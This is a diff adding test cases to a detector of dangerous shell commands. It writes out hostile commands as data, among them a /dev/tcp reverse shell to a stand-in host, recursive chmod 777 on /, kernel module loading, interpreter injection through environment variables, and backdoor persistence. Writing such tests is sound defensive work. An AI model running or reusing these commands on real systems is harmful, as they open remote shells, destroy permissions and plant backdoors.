@@ -894,6 +894,36 @@ describe("isDangerousCommand", () => {
     ["LD_PRELOAD env-var injection", "LD_PRELOAD=/tmp/evil.so command", "env-var-injection"],
     ["PYTHONPATH env-var injection", "PYTHONPATH=/tmp/evil python3 app.py", "env-var-injection"],
     ["NODE_PATH env-var injection", "NODE_PATH=/tmp/evil node index.js", "env-var-injection"],
+    ["RUBYOPT env-var injection", "RUBYOPT=-r/tmp/evil ruby app.rb", "env-var-injection"],
+    ["RUBYLIB env-var injection", "RUBYLIB=/tmp/evil ruby app.rb", "env-var-injection"],
+    ["PYTHONSTARTUP env-var injection", "PYTHONSTARTUP=/tmp/evil.py python3", "env-var-injection"],
+    // process-substitution-execution
+    ["process substitution bash", "tee >(bash)", "process-substitution-execution"],
+    ["process substitution sh", "cmd > >(sh -c 'id')", "process-substitution-execution"],
+    ["process substitution python3", "cmd > >(python3 exploit.py)", "process-substitution-execution"],
+    // env-interpreter-bypass (bash -c is shadowed by arbitrary-code-execution; use interpreters checked later)
+    ["env python3 -c bypass", "env python3 -c 'import os; os.system(\"id\")'", "env-interpreter-bypass"],
+    ["env perl -e bypass", "env perl -e 'system(\"id\")'", "env-interpreter-bypass"],
+    // dangerous-recursive-chmod
+    ["chmod -R on /", "chmod -R 777 /", "dangerous-recursive-chmod"],
+    ["chmod -R on ~", "chmod -R 777 ~", "dangerous-recursive-chmod"],
+    // dangerous-recursive-chown
+    ["chown -R on /", "chown -R root /", "dangerous-recursive-chown"],
+    ["chown -R on ~", "chown -R root ~", "dangerous-recursive-chown"],
+    // kernel-module-loading
+    ["insmod kernel module", "insmod evil.ko", "kernel-module-loading"],
+    ["modprobe kernel module", "modprobe evil_module", "kernel-module-loading"],
+    // kernel-parameter-tampering
+    ["sysctl -w parameter", "sysctl -w kernel.perf_event_paranoid=0", "kernel-parameter-tampering"],
+    ["sysctl --write parameter", "sysctl --write vm.overcommit_memory=1", "kernel-parameter-tampering"],
+    // reverse-shell
+    ["mkfifo named pipe reverse shell", "mkfifo /tmp/f", "reverse-shell"],
+    ["bash /dev/tcp reverse shell", "bash -i >& /dev/tcp/evil.com/4444 0>&1", "reverse-shell"],
+    // persistence (nohup/disown/screen/tmux)
+    ["nohup background process", "nohup ./backdoor.sh &", "persistence"],
+    ["disown bare", "disown", "persistence"],
+    ["screen -dm detached session", "screen -dm bash evil.sh", "persistence"],
+    ["tmux new-session -d detached", "tmux new-session -d -s evil", "persistence"],
   ])("detects %s → %s", (_desc, command, category) => {
     expect(isDangerousCommand(command)).toBe(category);
   });
